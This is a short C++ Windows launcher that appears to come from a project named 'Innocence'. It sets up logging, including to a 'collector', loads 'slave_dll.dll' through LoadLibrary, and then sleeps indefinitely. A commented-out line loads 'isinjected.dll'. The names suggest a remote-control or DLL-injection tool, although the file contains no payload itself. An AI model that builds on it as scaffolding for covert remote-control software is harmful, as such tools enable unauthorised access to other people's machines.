#include <windows.h>
#include <Innocence.hpp>
#include <common/Log.hpp>

int main()
{
	try
	{
		LOG.setIdentity(Innocence::identity);
		LOG.addObserver(new Common::LogToConsole);
		LOG.addObserver(new Common::LogToCollector);

		// Chargement normal de la DLL
		HMODULE hModule = LoadLibrary("slave_dll.dll");
		//HMODULE hModule = LoadLibrary("isinjected.dll");
		Sleep(INFINITE);
	}
	catch(...)
	{
	}
	return 0;
}
